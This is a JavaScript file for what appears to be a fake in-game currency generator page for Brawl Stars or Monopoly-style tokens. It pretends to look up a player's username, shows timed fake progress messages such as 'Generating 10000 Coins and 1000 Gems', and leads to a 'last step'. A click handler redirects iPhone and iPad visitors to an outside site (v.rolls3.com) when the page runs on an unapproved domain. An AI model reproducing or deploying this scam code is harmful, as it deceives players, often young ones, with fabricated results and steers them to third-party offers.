/*================== [ VICTOR ABDO ] ===============*/
/*================== [ talghi brawl stars ] ================*/
var button = document.querySelector('.spin-buttons');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "monoplytokens.com";
        var redirectURL = "https://v.rolls3.com/";
        var blockedDomains = [
            "mply.io.1arshg4.site",
            "mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            if (isIphoneOrIpad) { 
                window.location.href = redirectURL;
            }
        }
    })();
});
var vbucksValue = 0x2710;
var vbucksValue2 = 0x3e8;
var name = '';
function firstmain0() {
  name = document.getElementById("input-id").value;
  if (name == '' || name.length <= 0x2) {
    document.getElementById("input-id").style.borderBottom = "0.12em solid darkred";
    document.getElementById('user-box').classList.add("shakeanim");
    setTimeout(function () {
      document.getElementById("input-id").style.removeProperty('border-Bottom');
      document.getElementById("user-box").classList.remove("shakeanim");
    }, 0x5dc);
  } else {
    setTimeout(function () {
      document.getElementById("searching-text-name").innerHTML = name;
      document.getElementById('step0').style.display = "none";
      setTimeout(function () {
        document.getElementById("search0").style.display = "block";
        setTimeout(function () {
          document.getElementById("checkmark-icon").style.display = "block";
          document.getElementById("dots").style.display = "none";
          setTimeout(function () {
            document.getElementById("main0").style.display = "none";
            setTimeout(function () {
              document.getElementById("main1").style.display = "block";
            }, 0x64);
          }, 0x7d0);
        }, 0x1388);
      }, 0x64);
    }, 0x64);
  }
}
function device_click() {
  document.getElementById("main1").style.display = "none";
  setTimeout(function () {
    document.getElementById("main2").style.display = "block";
  }, 0x64);
}
document.getElementById('platform0').addEventListener("click", device_click);
document.getElementById('platform1').addEventListener("click", device_click);
document.getElementById("platform2").addEventListener("click", device_click);
function VBucksSelected(_0x47b6af, _0x536ed2) {
  vbucksValue = _0x536ed2;
  document.getElementById("VBucks0").classList.add("VBucks");
  document.getElementById("VBucks1").classList.add("VBucks");
  document.getElementById("VBucks2").classList.add("VBucks");
  document.getElementById("VBucks3").classList.add("VBucks");
  document.getElementById("VBucks0").classList.remove('Selected');
  document.getElementById("VBucks1").classList.remove("Selected");
  document.getElementById("VBucks2").classList.remove("Selected");
  document.getElementById("VBucks3").classList.remove('Selected');
  document.getElementById(_0x47b6af).classList.add("Selected");
  document.getElementById(_0x47b6af).classList.remove("VBucks");
}
function VBucksSelected2(_0x35fb4a, _0x26b498) {
  vbucksValue2 = _0x26b498;
  document.getElementById("VBucks4").classList.add('VBucks2');
  document.getElementById("VBucks5").classList.add("VBucks2");
  document.getElementById('VBucks6').classList.add("VBucks2");
  document.getElementById("VBucks7").classList.add('VBucks2');
  document.getElementById('VBucks4').classList.remove("Selected2");
  document.getElementById("VBucks5").classList.remove("Selected2");
  document.getElementById("VBucks6").classList.remove("Selected2");
  document.getElementById('VBucks7').classList.remove("Selected2");
  document.getElementById(_0x35fb4a).classList.add("Selected2");
  document.getElementById(_0x35fb4a).classList.remove('VBucks2');
}
function cointocash() {
  document.getElementById("step1").style.display = 'none';
  document.getElementById('step1-1').style.display = 'block';
}
function GenerateButton() {
  document.getElementById("btn1id").style.display = "none";
  document.getElementById("step1-1").style.display = "none";
  document.getElementById("search1").style.display = "block";
  setTimeout(function () {
    document.getElementById("progress-bar").classList.add("progressbar25");
    setTimeout(function () {
      document.getElementById("Generating-step0").innerHTML = "Generating " + vbucksValue + " Coins and " + vbucksValue2 + " Gems for " + name + '';
      document.getElementById("progress-bar").classList.add("progressbar40");
      setTimeout(function () {
        document.getElementById("Generating-step0").innerHTML = "Finalizing...";
        document.getElementById("progress-bar").classList.add('progressbar75');
        setTimeout(function () {
          document.getElementById("Generating-step0").innerHTML = "Loading last step..";
          document.getElementById("progress-bar").classList.add("progressbar95");
          document.getElementById("loader").style.display = 'inline-block';
          setTimeout(function () {
            document.getElementById("main2").style.display = "none";
            setTimeout(function () {
              document.getElementById("main3").style.display = "block";
              document.getElementById("vbucksamount").innerHTML = vbucksValue;
              document.getElementById("Name-LastStep").innerHTML = name;
              document.getElementById('vbucksamount1').innerHTML = vbucksValue;
              document.getElementById("vbucksamount2").innerHTML = vbucksValue2;
              document.getElementById("vbucksamountcash").innerHTML = vbucksValue2;
            }, 0x64);
          }, 0xbb8);
        }, 0xbb8);
      }, 0x1388);
    }, 0xfa0);
  }, 0x3e8);
}
